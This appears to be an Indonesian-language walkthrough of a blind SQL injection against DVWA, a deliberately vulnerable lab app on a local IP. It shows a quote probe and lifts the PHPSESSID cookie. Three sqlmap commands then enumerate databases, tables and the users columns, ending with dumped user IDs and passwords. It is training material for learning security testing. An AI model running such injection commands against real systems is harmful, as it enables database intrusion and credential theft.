<b> HOW TO SOLVE SQL INJECTION BLIND </b>


Sekarang kita coba menggunakan  
```
'1
```
 apakah vulnerable atau tidak
 
![Screenshot (464)](https://user-images.githubusercontent.com/118157585/216914220-44732cad-9ef5-48d2-a694-daf675c2651d.png)

dammmmn! ternyata vulnerable.

![Screenshot (465)](https://user-images.githubusercontent.com/118157585/216914282-690c2d67-87af-4de8-a98a-a38e345627c6.png)

nah sekarang saatnya kita copy link tersebut, untuk kita tes di tools <b><i> SQL Injection </i></b>

![Screenshot (467)](https://user-images.githubusercontent.com/118157585/216914420-1432de38-8c99-4103-b26b-ed528f4114c2.png)

sebelum ke <b><i> SQL Injection </i></b> kita cari tahu dulu PHPSESSID nya, yaitu dengan klik kanan pada tampilan dvwa SQLI Blind, llau klik inspect element, nah setelah itu klik storage.

![Screenshot (468)](https://user-images.githubusercontent.com/118157585/216914472-d1365172-f36a-4f67-b3fd-b78ce72bccf4.png)

nahhhh sekarang kita coba crack databases nya, ada apa ajasih disana. dengan mengetikkan perintah :

```
sqlmap -u 'http://192.168.18.115/DVWA/vulnarebilities/sqli_blind/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=gg58gd3lp0rqeq3rftt96l1b3kq' --dbs
```

ternyata disana ada <b><i> * dvwa dan * information_scheme </i></b>.

![Screenshot (473)](https://user-images.githubusercontent.com/118157585/216918953-f94e854d-a85d-4602-b0b2-c8c0d89ba805.png)

sekarang kita lanjut untuk mencari tables nya, kita crack databases <b><i> dvwa </i></b> , dengan mengetikkan perintah :

```
sqlmap -u 'http://192.168.18.115/DVWA/vulnarebilities/sqli_blind/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=gg58gd3lp0rqeq3rftt96l1b3kq' -D dvwa --tables
```

nah disana terdapat 2 tables yaitu <b><i> guestbook dan users </i></b>

![Screenshot (469)](https://user-images.githubusercontent.com/118157585/216914534-a11d21ed-488b-4cc2-964c-80d04f2316c6.png)

lalu sekarang kita lanjut untuk mencari columns nya dari tables kedua tersebut, tapi saya feeling columns yang penting berada di tables <b><i> users </i></b>.
jadi kita crack di tables <b><i> users </i></b> dengan menggunakan perintah :

```
sqlmap -u 'http://192.168.18.115/DVWA/vulnarebilities/sqli_blind/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=gg58gd3lp0rqeq3rftt96l1b3kq' -T users --columns
```

nah disini terdapat 8 columns yang mana salah dua column tersebut adalah yang kita cari, yaitu <b><i> password dan user_id </i></b>

![Screenshot (470)](https://user-images.githubusercontent.com/118157585/216914627-66c0f0cc-8238-4fb1-9e14-3a5366b64288.png)

ini tampilan saat kita sudah ngedump <b><i>user_id</i></b> columns

![Screenshot (471)](https://user-images.githubusercontent.com/118157585/216914738-07273ce5-2666-4607-89a5-e8390b9aa9c0.png)

ini tampilan saat kita sudah ngedump <b><i>password</i></b> columns

![Screenshot (472)](https://user-images.githubusercontent.com/118157585/216914855-fea2c425-2fe1-4fad-8929-a3d3e1584747.png)
